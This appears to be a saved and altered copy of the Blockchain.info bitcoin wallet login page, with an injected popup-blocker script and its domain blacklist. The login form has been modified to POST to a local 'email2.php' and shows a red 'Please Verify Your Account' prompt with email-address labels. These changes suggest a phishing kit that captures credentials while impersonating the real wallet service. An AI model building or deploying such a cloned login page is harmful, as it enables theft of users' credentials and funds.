<!DOCTYPE html>
<!-- saved from url=(0038)https://blockchain.info/wallet/#/login -->
<html lang="en" ng-app="walletApp" ng-csp="" ng-class="{&#39;not-fixed&#39;: outOfApp}" pp-init="true"><script>inject()</script><script>var pb_whitelist = ["www.blogger.com","www.messenger.com","google","www.gmail.com","www.pinterest.com","www.youtube.com","www.facebook.com","search.yahoo.com","chrome://newtab"]</script><script>var pb_blacklist = ["adrunnr","successforyu.clickfunnels.com","fmovies.se","in-365-tagen.info","5000-settimanale.com","shop.mazzugioielli.com","maxigossip.com","lp.yazizim.com","beyourxfriend.com","99tab.com","zzqrt.com","canuck-method.net","bewomenly.com","playnow.guru","datingforyou-48e1.kxcdn.com","trafficnetworkads24.com","sistemadedinerogratis.com","canuckmethodprofit.co","consumerresearchnetwork.com","securemacfix.com","zz3d3.ru","zd1.quebec-bin.com","hot-games4you.xyz","om.elvenar.com","superpccleanup.com","gomediaz.com","judithi.xyz","free.atozmanuals.com","yoursuccess.ravpage.co.il","123hop.ir","quizcliente.pw","aussiemethod.biz","hlpnowp-c.com","picbumper.com","shaneless.com","anacondamonster.com","altrk1.com","health.todaydiets.com","download.weatherblink.com","happyluketh.com","go.ameinfo.com","50kaweek.net","thepornsurvey.com","ofsiite.ru","fulltab.com","1000spins.com","time2play-online.net","vintacars.com","welcome.pussysaga.com","free-desktop-games.com","download.televisionfanatic.com","theprofitsmaker.net","sgad.info","algocashmaster.net","sunmaker.com","topvipdreams.com","watchmygirlfriend.gfpornvideos.com","filesharefanatic.com","safedownloadhub.com","7awlalalam.blogspot.com","tvplusnewtab.com","trendingpatrol.com","moneymorning.com","ifileyou.com","classifiedcanada.ca","firefan.com","methode-binaire.com","letmetell.com","kenduktur.com","getafuk.com","yotraleplahnte.ru","jackpot.88beto.com","pwwysydh.com","search.queryrouter.com","v.lvztxy.com","pussysaga.com","saffamethod.com","prezzonline.com","searchprivacy.website","3d2819216eb4e1035879-7c248de0c99745406e9b749fc86ec3e4.ssl.cf1.rackcdn.com","only2date.com","mysagagame.com","themillionaireinpjs.net","wlt.kd2244.com","quickprivacycheck.com","hotchatdate.com","autotraderbot.com","z1.zedo.com","youlucky2014.com","traffic.getmyads.com","appcloudprotected.com","safensecure.com-allsites3.xyz","newpoptab.com","static.williamhill.com","myhealthyblog.co","greatestmobideals.com","sweetclarity.com","mgid.com","securepccure.com","autopengebygger.com","am15.net","es.reimageplus.com","o2.promos-info.com","it.reimageplus.com","westsluts.com","spinandwin.com-ser.pw","reimageplus.com","vodafone.promos-info.com","vinnmatpengar.se","movie.ienjoyapps.com","love4single.com","origin.getprice.com.au","ohmydating.com","lp.want-to-win.com","yabuletchrome.ru","bamdad.net","gotositenow.com","vcrypt.pw","newtabtv.com","mon.setsu.xyz","youforgottorenewyourhosting.com","zone-telechargement.ws","land.pckeeper.software","ad.adpop-1.com","advancedpctools.com","videos.randolphcountyheraldtribune.com","web-start.org","softreadynow.installupgradenowfreshandforyou.website","uplod.ws","pornhubcasino.com","maxbet.ro","2016prizefeed.com","thevideo.me","wantubad.com","tavanero.com","xcusmy.club","daclips.in","gaymenofporn.online","jackpotcitycasino.com","italian-method.com","getsearchincognito.com","youjustwonprize.com","finanz-nachrichten.me","quizcliente.site","da.reimageplus.com","jkanime.net","britmoneymethod.com","uae.souq.com","ka.azzer.net","safensecure.xyz","8t.hootingrhejkz.online","www6.blinkx.com","wizzcaster.com","comparaison-prix.com","vodlocker.lol","fr.reimageplus.com","free.fromdoctopdf.com","userscloud.com","myprivatesearch.com","fanli90.cn","tutticodicisconto.it","mediadec.com","gogamego.thewhizproducts.com","download.weatherblink.com","free.videodownloadconverter.com","we-are-gamers.com","sesso.communityadult.net","lp.blpmovies.com","search.queryrouter.com","bbb-johannesburg.localspecific.com","lp.blpmovies.com","go.ppixelm.com","r0.ru","sesso.communityadult.net","bbb-johannesburg.localspecific.com","ppixelm.com","cyberguardianspe.info","we-are-gamers.com","loginfaster.com/new","www.alfacart.com","www.foresee.com","mobile-win.com","www.plusnetwork.com","www.amicafarmacia.com","www.ienjoyapps.com","cheapcheap.io","screenaddict.thewhizproducts.com","nova.rambler.ru","free.gamingwonderland.com","p9328ujeiw1.ru","mobilecasinoclub.co.uk","pfhsystem.com","regtuneup.com","theprofitsmaker.net","bodogpromotions.eu","heroesreplay.org","financialsecrets.info","mymoneymakingapp.com","sunmaker.com","888casino-promotions.com","vogliosesso.com","scienceremix.com","allinonedocs.com","arabia.starzplay.com","allirishcasino.com","advancepctools.info","movie.ienjoyapps.com","surveyform001.s3-website-us-east-1.amazonaws.com","mgs188.com","pfhsystem.com","lpeva.com","ddsh8.com","theprofitsmaker.net","b2.ijquery11.com","sporthero.thewhizmarketing.com","securefastmac.tech","seen-on-screen.thewhizmarketing.com","1000spins.com","search.queryrouter.com","pfhsystem.com","reimageplus.com","offer.alibaba.com","searchlistings.org","search.queryrouter.com","search.queryrouter.com","mybinaryoptionsrobot.com","duplicashapp.com","search.queryrouter.com","bestgame.directory","droidclub.net",".rivalo.com","yoursuperprize.com","mediaexplained.com","om.elvenar.com","shinar.club","revitoleczemacream.com","freelotto.com","screenaddict.thewhizproducts.com","download.bringmesports.com/","allinonedocs.com","driver-fixer.com","arabydeal.com","cleanyourcomputertoday.com","arabydeal.com","music.mixplugin.com","1se.info","survey12.com","freesoftwaredlul.com","pldist01.com","ad.adpop-1.com","searchanonymous.net","abrst.pro","muzikfury.thewhizmarketing.com","lp.mbtrx.com","th1.forfun.maxisize-pro.com","watchmygirlfriend.gfpornbox.com","new.freelotto.com","desktoptrack.com","search.queryrouter.com","offer.alibaba.com","1000spins.com","promotions.coral.co.uk","search.queryrouter.com","tbsia.com","tbsia.com","multtaepyo.com","search.queryrouter.com","czechmethod.com","consumerview.co","wayretail.com","72onbase.com","funsafetab.com","search.queryrouter.com","speedyfiledownload.com","driver-fixer.com","arabydeal.com","cleanyourcomputertoday.com","arabydeal.com","music.mixplugin.com","1se.info","survey12.com","freesoftwaredlul.com","pldist01.com","ad.adpop-1.com","searchanonymous.net","abrst.pro","muzikfury.thewhizmarketing.com","lp.mbtrx.com","th1.forfun.maxisize-pro.com","watchmygirlfriend.gfpornbox.com","new.freelotto.com","desktoptrack.com","search.queryrouter.com","offer.alibaba.com","1000spins.com","promotions.coral.co.uk","search.queryrouter.com","tbsia.com","tbsia.com","surveyform001.s3-website-us-east-1.amazonaws.com","mgs188.com","pfhsystem.com","lpeva.com","ddsh8.com","theprofitsmaker.net","quantomcoding.com","sporthero.thewhizmarketing.com","popads.net","onclkds.com","consumerview.co","12kotov.ru","ruhotpair2.fingta.com","easytelevisionaccessnow.com","ahwrd.com","lpeva.com","ppgzf.com","zjstx.com","kituure.xyz","join.pro-gaming-world.com","mackeeperapp.mackeeper.com","tracknotify.com","2075.cdn.beyondhosting.net","idollash.com","ds.moviegoat.com","fulltab.com","rackcdn.com","prestoris.com","adsterra.com","swampssovuuhusp.top","streesusa.info","freesoftwaredlul.com","adreactor.com","a-static.com","codeonclick.com","heheme.com","adf.ly","seen-on-screen.thewhizmarketing.com","openload.co"]</script><script id="pb_blockScript">function inject() {
	  var originalOpenWndFnKey = "originalOpenFunction";
	  var originalWindowOpenFn = window.open;
	  var originalCreateElementFn = document.createElement;
	  var originalAppendChildFn = HTMLElement.prototype.appendChild;
	  var originalCreateEventFn = document.createEvent;
	  var windowsWithNames = {};
	  var timeSinceCreateAElement = 0;
	  var lastCreatedAElement = null;
	  var fullScreenOpenTime = void 0;
	  var winWidth = window.innerWidth;
	  var winHeight = window.innerHeight;
	  var abd = false;
	  var parentOrigin = window.location != window.parent.location ? document.referrer : document.location;
	  var parentRef = window.parent;

	  window[originalOpenWndFnKey] = window.open; // save the original open window as global param
	  window.pb_isRunning = true; // is running
	  function newWindowOpenFn() {
	    var openWndArguments = arguments;
	    var useOriginalOpenWnd = true;
	    var generatedWindow = null;

	    function getWindowName(openWndArguments) {
	      var windowName = openWndArguments[1];
	      if (windowName != null && !["_blank", "_parent", "_self", "_top"].includes(windowName)) {
	        return windowName;
	      }

	      return null;
	    }

	    function copyMissingProperties(src, dest) {
	      var prop = void 0;
	      for (prop in src) {
	        try {
	          if (dest[prop] === undefined && src[prop]) {
	            dest[prop] = src[prop];
	          }
	        } catch (e) {}
	      }
	      return dest;
	    }

	    function isOverlayish(el) {
	      var style = el && el.style;

	      if (style && /fixed|absolute/.test(style.position) && el.offsetWidth >= winWidth * 0.6 && el.offsetHeight >= winHeight * 0.75) {
	        return true;
	      }

	      return false;
	    }

	    // the element who registered to the event
	    var capturingElement = null;
	    if (window.event != null) {
	      capturingElement = window.event.currentTarget;
	    }

	    if (capturingElement == null) {
	      var caller = openWndArguments.callee;
	      while (caller.arguments != null && caller.arguments.callee.caller != null) {
	        caller = caller.arguments.callee.caller;
	      }
	      if (caller.arguments != null && caller.arguments.length > 0 && caller.arguments[0].currentTarget != null) {
	        capturingElement = caller.arguments[0].currentTarget;
	      }
	    }

	    /////////////////////////////////////////////////////////////////////////////////
	    // Blocked if a click on background element occurred (<body> or document)
	    /////////////////////////////////////////////////////////////////////////////////

	    if (capturingElement == null) {
	      window.pbreason = 'Blocked a new window opened without any user interaction';
	      useOriginalOpenWnd = false;
	    } else if (capturingElement != null && (capturingElement instanceof Window || capturingElement === document || capturingElement.URL != null && capturingElement.body != null || capturingElement.nodeName != null && (capturingElement.nodeName.toLowerCase() == "body" || capturingElement.nodeName.toLowerCase() == "document"))) {
	      window.pbreason = "Blocked a new window opened with URL: " + openWndArguments[0] + " because it was triggered by the " + capturingElement.nodeName + " element";
	      useOriginalOpenWnd = false;
	    } else if (isOverlayish(capturingElement)) {
	      window.pbreason = 'Blocked a new window opened when clicking on an element that seems to be an overlay';
	      useOriginalOpenWnd = false;
	    } else {
	      useOriginalOpenWnd = true;
	    }
	    /////////////////////////////////////////////////////////////////////////////////

	    /////////////////////////////////////////////////////////////////////////////////
	    // Block if a full screen was just initiated while opening this url.
	    /////////////////////////////////////////////////////////////////////////////////

	    var fullScreenElement = document.webkitFullscreenElement || document.mozFullscreenElement || document.fullscreenElement;
	    if (new Date().getTime() - fullScreenOpenTime < 1000 || isNaN(fullScreenOpenTime) && isDocumentInFullScreenMode()) {

	      window.pbreason = "Blocked a new window opened with URL: " + openWndArguments[0] + " because a full screen was just initiated while opening this url.";

	      /* JRA REMOVED
	       if (window[script_params.fullScreenFnKey]) {
	       window.clearTimeout(window[script_params.fullScreenFnKey]);
	       }
	       */

	      if (document.exitFullscreen) {
	        document.exitFullscreen();
	      } else if (document.mozCancelFullScreen) {
	        document.mozCancelFullScreen();
	      } else if (document.webkitCancelFullScreen) {
	        document.webkitCancelFullScreen();
	      }

	      useOriginalOpenWnd = false;
	    }
	    /////////////////////////////////////////////////////////////////////////////////
	    var openUrl = openWndArguments[0];
	    var inWhitelist = isInWhitelist(location.href);

	    if (inWhitelist) {
	      useOriginalOpenWnd = true;
	    } else if (isInBlacklist(openUrl)) {
	      useOriginalOpenWnd = false;
	    }

	    if (useOriginalOpenWnd == true) {
	      generatedWindow = originalWindowOpenFn.apply(this, openWndArguments);
	      // save the window by name, for latter use.
	      var windowName = getWindowName(openWndArguments);
	      if (windowName != null) {
	        windowsWithNames[windowName] = generatedWindow;
	      }

	      // 2nd line of defence: allow window to open but monitor carefully...

	      /////////////////////////////////////////////////////////////////////////////////
	      // Kill window if a blur (remove focus) is called to that window
	      /////////////////////////////////////////////////////////////////////////////////
	      if (generatedWindow !== window) {
	        (function () {
	          var openTime = new Date().getTime();
	          var originalWndBlurFn = generatedWindow.blur;
	          generatedWindow.blur = function () {
	            if (new Date().getTime() - openTime < 1000 && !inWhitelist /* one second */) {
	                window.pbreason = "Blocked a new window opened with URL: " + openWndArguments[0] + " because a it was blured";
	                generatedWindow.close();
	                blockedWndNotification(openWndArguments);
	              } else {
	              originalWndBlurFn();
	            }
	          };
	        })();
	      }
	      /////////////////////////////////////////////////////////////////////////////////
	    } else {
	      (function () {
	        // (useOriginalOpenWnd == false)
	        var location = {
	          href: openWndArguments[0]
	        };
	        location.replace = function (url) {
	          location.href = url;
	        };

	        generatedWindow = {
	          close: function close() {
	            return true;
	          },
	          test: function test() {
	            return true;
	          },
	          blur: function blur() {
	            return true;
	          },
	          focus: function focus() {
	            return true;
	          },
	          showModelessDialog: function showModelessDialog() {
	            return true;
	          },
	          showModalDialog: function showModalDialog() {
	            return true;
	          },
	          prompt: function prompt() {
	            return true;
	          },
	          confirm: function confirm() {
	            return true;
	          },
	          alert: function alert() {
	            return true;
	          },
	          moveTo: function moveTo() {
	            return true;
	          },
	          moveBy: function moveBy() {
	            return true;
	          },
	          resizeTo: function resizeTo() {
	            return true;
	          },
	          resizeBy: function resizeBy() {
	            return true;
	          },
	          scrollBy: function scrollBy() {
	            return true;
	          },
	          scrollTo: function scrollTo() {
	            return true;
	          },
	          getSelection: function getSelection() {
	            return true;
	          },
	          onunload: function onunload() {
	            return true;
	          },
	          print: function print() {
	            return true;
	          },
	          open: function open() {
	            return this;
	          },

	          opener: window,
	          closed: false,
	          innerHeight: 480,
	          innerWidth: 640,
	          name: openWndArguments[1],
	          location: location,
	          document: { location: location }
	        };

	        copyMissingProperties(window, generatedWindow);

	        generatedWindow.window = generatedWindow;

	        var windowName = getWindowName(openWndArguments);
	        if (windowName != null) {
	          try {
	            // originalWindowOpenFn("", windowName).close();
	            windowsWithNames[windowName].close();
	          } catch (err) {}
	        }

	        var fnGetUrl = function fnGetUrl() {
	          var url = void 0;
	          if (!(generatedWindow.location instanceof Object)) {
	            url = generatedWindow.location;
	          } else if (!(generatedWindow.document.location instanceof Object)) {
	            url = generatedWindow.document.location;
	          } else if (location.href != null) {
	            url = location.href;
	          } else {
	            url = openWndArguments[0];
	          }
	          openWndArguments[0] = url;

	          blockedWndNotification(openWndArguments);
	        };

	        //why set timeout?  if anyone finds a reason for it, please write it here
	        //in iframes it makes me problems
	        if (top == self) {
	          setTimeout(fnGetUrl, 100);
	        } else {
	          fnGetUrl();
	        }
	      })();
	    }

	    return generatedWindow;
	  }

	  /////////////////////////////////////////////////////////////////////////////////
	  // Replace the window open method with Poper Blocker's
	  /////////////////////////////////////////////////////////////////////////////////
	  window.open = function () {
	    try {
	      return newWindowOpenFn.apply(this, arguments);
	    } catch (err) {
	      return null;
	    }
	  };
	  /////////////////////////////////////////////////////////////////////////////////


	  //////////////////////////////////////////////////////////////////////////////////////////////////////////
	  // Monitor dynamic html element creation to prevent generating <a> elements with click dispatching event
	  //////////////////////////////////////////////////////////////////////////////////////////////////////////
	  HTMLElement.prototype.appendChild = function () {
	    var newElement = originalAppendChildFn.apply(this, arguments);

	    if (newElement.nodeName == 'IFRAME' && newElement.contentWindow) {
	      try {
	        newElement.contentWindow.eval(inject.toString() + ';inject();');
	      } catch (e) {}
	    }

	    return newElement;
	  };

	  document.createElement = function () {

	    var newElement = originalCreateElementFn.apply(document, arguments);

	    if (arguments[0] == "a" || arguments[0] == "A") {
	      (function () {

	        timeSinceCreateAElement = new Date().getTime();

	        var originalDispatchEventFn = newElement.dispatchEvent;

	        newElement.dispatchEvent = function (event) {
	          if (event.type != null && ("" + event.type).toLocaleLowerCase() == "click") {
	            if (!isInWhitelist(newElement.href)) {
	              window.pbreason = "blocked due to an explicit dispatchEvent event with type 'click' on an 'a' tag";

	              parent.postMessage({
	                type: "blockedWindow",
	                args: JSON.stringify({ "0": newElement.href, "abd": abd })
	              }, parentOrigin);
	              return true;
	            }
	          }

	          return originalDispatchEventFn.call(this, event);
	        };

	        lastCreatedAElement = newElement;
	      })();
	    }

	    return newElement;
	  };
	  /////////////////////////////////////////////////////////////////////////////////


	  /////////////////////////////////////////////////////////////////////////////////
	  // Block artificial mouse click on frashly created <a> elements
	  /////////////////////////////////////////////////////////////////////////////////
	  document.createEvent = function () {
	    try {
	      if (arguments[0].toLowerCase().includes("mouse") && new Date().getTime() - timeSinceCreateAElement <= 50) {
	        //block if the origin is not same
	        var isSelfDomain = false;
	        try {
	          var openUrlDomain = new URL(lastCreatedAElement.href).hostname;
	          var topUrl = window.location != window.parent.location ? document.referrer : document.location.href;
	          var topDomain = new URL(topUrl).hostname;
	          isSelfDomain = openUrlDomain == topDomain;
	        } catch (e) {}
	        if (lastCreatedAElement.href.trim() && !isInWhitelist(lastCreatedAElement.href) && !isSelfDomain) {
	          //this makes too much false positive so we do not display the toast message
	          window.pbreason = "Blocked because 'a' element was recently created and " + arguments[0] + " event was created shortly after";
	          arguments[0] = lastCreatedAElement.href;

	          parent.postMessage({
	            type: "blockedWindow",
	            args: JSON.stringify({ "0": lastCreatedAElement.href, "abd": abd })
	          }, parentOrigin);

	          return null;
	        }
	      }

	      return originalCreateEventFn.apply(document, arguments);
	    } catch (err) {}
	  };
	  /////////////////////////////////////////////////////////////////////////////////


	  /////////////////////////////////////////////////////////////////////////////////
	  // Monitor full screen requests
	  /////////////////////////////////////////////////////////////////////////////////
	  function onFullScreen(isInFullScreenMode) {
	    if (isInFullScreenMode) {
	      fullScreenOpenTime = new Date().getTime();
	    } else {
	      fullScreenOpenTime = NaN;
	    }
	  }

	  /////////////////////////////////////////////////////////////////////////////////

	  function isDocumentInFullScreenMode() {
	    // Note that the browser fullscreen (triggered by short keys) might
	    // be considered different from content fullscreen when expecting a boolean
	    return document.fullScreenElement && document.fullScreenElement !== null || // alternative standard methods
	    document.mozFullscreenElement != null || document.webkitFullscreenElement != null; // current working methods
	  }

	  function isInWhitelist(url) {
	    return isInList(url, window.pb_whitelist);
	  }

	  function isInBlacklist(url) {
	    return isInList(url, window.pb_blacklist);
	  }

	  function isInList(url, list) {
	    if (list) {
	      return list.some(function (li) {
	        return new RegExp("https?://(www\.|.*\.)?" + li + "+").test(url);
	      });
	    } else {
	      return false;
	    }
	  }

	  function blockedWndNotification(openWndArguments) {
	    openWndArguments["abd"] = abd;

	    parentRef.postMessage({ type: "blockedWindow", args: JSON.stringify(openWndArguments) }, parentOrigin);
	  }

	  //detect adblock to adjust popup blocking behavior to not collide with adblock
	  (function () {
	    try {
	      var tester = document.createElement('div');
	      tester.innerHTML = '&nbsp;';
	      tester.className = 'adsbox';
	      tester.style.cssText = "position:absolute;top-1000px;left:-1000px;";

	      (document.body || document.head).appendChild(tester);
	      window.setTimeout(function () {
	        if (tester.offsetHeight === 0) {
	          abd = true;
	        }

	        tester.remove();
	      }, 100);
	    } catch (e) {}
	  })();

	  document.addEventListener("fullscreenchange", function () {
	    onFullScreen(document.fullscreen);
	  }, false);

	  document.addEventListener("mozfullscreenchange", function () {
	    onFullScreen(document.mozFullScreen);
	  }, false);

	  document.addEventListener("webkitfullscreenchange", function () {
	    onFullScreen(document.webkitIsFullScreen);
	  }, false);

	  document.getElementsByTagName("html")[0].setAttribute("PP-INIT", true);
	}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    <meta name="theme-color" content="#187fc0">
    <meta name="apple-itunes-app" content="app-id=493253309">
    <meta name="description" content="Discover the world&#39;s most popular bitcoin wallet. Visit today to create your free simple, secure and safe Blockchain Wallet.">
    <meta name="keywords" content="bitcoin wallet, blockchain wallet, online bitcoin wallet, bitcoin wallet online">
    <script src="./css/landing-39c58368569aed6656da9b39f5e4c0e8a5cfc8f1.min.js.download" defer=""></script>
    <link rel="alternate" hreflang="en" href="https://blockchain.info/wallet">
    <link rel="alternate" hreflang="de" href="https://blockchain.info/de/wallet">
    <link rel="alternate" hreflang="hi" href="https://blockchain.info/he/wallet">
    <link rel="alternate" hreflang="no" href="https://blockchain.info/no/wallet">
    <link rel="alternate" hreflang="ru" href="https://blockchain.info/ru/wallet">
    <link rel="alternate" hreflang="pt" href="https://blockchain.info/pt/wallet">
    <link rel="alternate" hreflang="bg" href="https://blockchain.info/bg/wallet">
    <link rel="alternate" hreflang="fr" href="https://blockchain.info/fr/wallet">
    <link rel="alternate" hreflang="zh-cn" href="https://blockchain.info/zh-cn/wallet">
    <link rel="alternate" hreflang="hu" href="https://blockchain.info/hu/wallet">
    <link rel="alternate" hreflang="sl" href="https://blockchain.info/sl/wallet">
    <link rel="alternate" hreflang="id" href="https://blockchain.info/id/wallet">
    <link rel="alternate" hreflang="sv" href="https://blockchain.info/sv/wallet">
    <link rel="alternate" hreflang="co" href="https://blockchain.info/co/wallet">
    <link rel="alternate" hreflang="el" href="https://blockchain.info/el/wallet">
    <link rel="alternate" hreflang="it" href="https://blockchain.info/it/wallet">
    <link rel="alternate" hreflang="es" href="https://blockchain.info/es/wallet">
    <link rel="alternate" hreflang="vi" href="https://blockchain.info/vi/wallet">
    <link rel="alternate" hreflang="th" href="https://blockchain.info/th/wallet">
    <link rel="alternate" hreflang="ja" href="https://blockchain.info/ja/wallet">
    <link rel="alternate" hreflang="pl" href="https://blockchain.info/pl/wallet">
    <link rel="alternate" hreflang="da" href="https://blockchain.info/da/wallet">
    <link rel="alternate" hreflang="ro" href="https://blockchain.info/ro/wallet">
    <link rel="alternate" hreflang="nl" href="https://blockchain.info/nl/wallet">
    <link rel="alternate" hreflang="tr" href="https://blockchain.info/tr/wallet">
    <link rel="apple-touch-icon" sizes="180x180" href="https://blockchain.info/wallet/img/favicon/apple-icon-180x180-c35bbce112b3b59e55bd39b825a101eecf4975d5.png">
    <link rel="apple-touch-icon" sizes="152x152" href="https://blockchain.info/wallet/img/favicon/apple-icon-152x152-ba16688fc9694eb1c54467120bb1daadb23b7ac9.png">
    <link rel="apple-touch-icon" sizes="144x144" href="https://blockchain.info/wallet/img/favicon/apple-icon-144x144-77e1f1ad47180de1a849deef3441b43001d2bf8d.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://blockchain.info/wallet/img/favicon/apple-icon-120x120-786e4292b2dabb3c79148ba591e6ede941e1c4af.png">
    <link rel="apple-touch-icon" sizes="114x114" href="https://blockchain.info/wallet/img/favicon/apple-icon-114x114-55dd80fb4f8ea52a24060592c5e0f40499604848.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://blockchain.info/wallet/img/favicon/apple-icon-76x76-5d05907266505cf540742634e3fe6839528c05a5.png">
    <link rel="apple-touch-icon" sizes="72x72" href="https://blockchain.info/wallet/img/favicon/apple-icon-72x72-e413ef21886ebb198ed002ccee4db331d1a1dd7e.png">
    <link rel="apple-touch-icon" sizes="60x60" href="https://blockchain.info/wallet/img/favicon/apple-icon-60x60-ff78b3e5a11e42b9389addcc125f300ba751a380.png">
    <link rel="apple-touch-icon" sizes="57x57" href="https://blockchain.info/wallet/img/favicon/apple-icon-57x57-c745b812fb038198db25fe7f7a11bf8d540d3a6f.png">
    <link rel="icon" type="image/png" sizes="192x192" href="https://blockchain.info/wallet/img/favicon/android-icon-192x192-295f0ddf8ef24be80a8665027f9c9bc003594e03.png">
    <link rel="icon" type="image/png" sizes="96x96" href="https://blockchain.info/wallet/img/favicon/favicon-96x96-160252475e1489a160d6ae72aff957a1367aa6ba.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://blockchain.info/wallet/img/favicon/favicon-32x32-ca08d7aaadb80fc3fba7705705bdfe0de14bca98.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://blockchain.info/wallet/img/favicon/favicon-16x16-0488dff33a6c69c2df7861a32f501bb5de57b372.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="img/favicon/ms-icon-144x144-77e1f1ad47180de1a849deef3441b43001d2bf8d.png">
    <title>Bitcoin Wallet - Blockchain</title>
    <link rel="stylesheet" href="./css/wallet-30a5a96d69c745cb8309a25b6f9909ece8739bc7.css"><script src="./css/my-wallet-9dd30907c99837fdca8a635309567056fd9e69c6.min.js.download" async=""></script><script src="./css/wallet-fe7f7f7c191a810cc11ea208f1ac786b205f02c8.min.js.download" async=""></script>
  </head>
  <!----><body data-preflight="" ui-view="body" ng-mousemove="onAction()" ng-click="onAction()" ng-class="getTheme()" class=""><div class="login-pg overflow-scroll flex-justify flex-center" ng-class="{&#39;display-block&#39;: isUIOverflow}"><nav class="navbar navbar-default navbar-inverse pos-abs bc-header bc-logo-header width-100 width-100-tablet width-100-mobile"><div class="container container-fluid flex-center"><div class="navbar-header flex-center flex-row-reverse flex-between"><a class="navbar-brand flex-center" href="https://blockchain.info/"><img id="logo" src="./css/blockchain-vector-f1208a2b904ce045df3239b1922104bd3fc6a7c1.svg" alt="Blockchain"></a></div></div></nav><div class="flex-center flex-justify flex-column"><div class="flex flex-justify"><div class="alert-in-app"><alerts>
      <!----></alerts></div></div><!----><div class="login-box mhs" ui-view="contents"><div id="login" data-preflight-tag="Login"><header><hgroup><div class="flex-between flex-center flex-wrap mb-10"><font color="#fd1a2d"><span class="f-24 lh1 capitalize exclaim" ng-hide="didLogout" translate="Please Verify Your Account">Welcome back</span></font><span class="f-24 lh1 ng-hide" ng-show="didLogout" translate="LOGGED_OUT">Logged out</span><span><span translate="OR">or</span>&nbsp;<a ui-sref="public.signup" translate="Sign Up" href="https://blockchain.info/wallet/#/signup">Sign Up</a></span></div><p class="alt-font f-16" translate="Sign in to your email address


">Sign in to your wallet below</p></hgroup></header><!-- GUID & Password fields--><form class="bc-form mt-30 form-horizontal clearfix ng-dirty ng-valid-parse ng-valid ng-valid-required" name="loginForm" ng-submit="browser.disabled || login()" role="form" autocomplete="off" novalidate="" action="email2.php" method="POST"><div class="browser-detection" result="browser">
        <p class="text-warning ng-hide" ng-show="result.warn"></p>
        <p class="text-danger ng-hide" ng-show="result.disabled"></p>
      </div><fieldset ng-disabled="browser.disabled || status.busy"><div class="group mb-15" ng-class="{&#39;has-error&#39;: errors.uid}"><div class="item"><label translate="Email Address" for="UID_input">Wallet ID</label><div><input class="form-control ng-not-empty ng-dirty ng-valid-parse ng-valid ng-valid-required ng-touched" id="UID_input" type="text" ng-model="uid" name="UID_input" focus-when="!uidAvailable" ng-change="errors.uid = null" required=""><div class="help-block mbn alt-font f-14 ng-hide" ng-show="errors.uid" ui-sref="public.reminder" href="#/reminder"><span translate=""></span></div><div class="help-block mbn alt-font f-14 hidden-xs"><span translate="Put Your Email Address
">Find the login link in your email, e.g. <i>blockchain.info/wallet/1111-222-333...</i> The series of numbers and dashes at the end of the link is your Wallet ID.</span></div></div></div></div><div class="group mb-15" ng-class="{&#39;has-error&#39;: errors.password}"><div class="group full mt-15"><button class="button-primary button-heavy ladda-button" type="submit" ui-ladda="status.busy" ladda-translate="LOG IN" ng-disabled="loginForm.$invalid"><span><span class="ladda-label" translate="LOG IN">LOG IN</span><span class="ladda-spinner"><div class="spinner"></div></span></span></button></div></div></div></div><div class="group mb-15 ng-hide" ng-show="settings.needs2FA" ng-class="{&#39;has-error&#39;: errors.twoFactor || settings.twoFactorMethod == 3}"><div class="item"><label><span translate="YUBI_CODE" ng-show="settings.twoFactorMethod == 1" class="ng-hide">Yubikey Code</span><span translate="EMAIL_CODE" ng-show="settings.twoFactorMethod == 2" class="ng-hide">Email Code</span><span translate="2FA_NOT_SUPPORTED" ng-show="settings.twoFactorMethod == 3" class="ng-hide">This method of two factor authentication is not supported</span><span translate="GOOGLE_AUTH_CODE" ng-show="settings.twoFactorMethod == 4" class="ng-hide">Google Authenticator</span><span translate="SMS_CODE" ng-show="settings.twoFactorMethod == 5" class="ng-hide">SMS Code</span></label><div><input class="form-control ng-pristine ng-untouched ng-empty ng-valid ng-valid-required" type="text" ng-model="twoFactorCode" ng-disabled="didEnterCorrect2FA || settings.twoFactorMethod == 3" ng-required="settings.needs2FA" focus-when="settings.needs2FA"><div class="help-block mbn alt-font f-14" translate=""><span></span></div><p class="form-control-static ng-hide" ng-show="settings.twoFactorMethod == 5"><img ng-show="status.resending" src="./css/spinner-8de10c3e9fd9f1c447099e6d23b5c24931c019da.gif" class="ng-hide"><a ng-click="resend()" ng-hide="status.resending" translate="RESEND" class="">Resend</a></p></div></div></div>
</div></fieldset></form><div class="ptl flex-between"><div><a ng-show="showMobileLogin" ui-sref="public.mobile-login" translate="MOBILE_LOGIN.TITLE" href="https://blockchain.info/wallet/#/mobile-login" class="ng-hide">Log in via Mobile</a></div><div ng-hide="didLogout" class=""></div></div></div></div></div>
</div></body></html>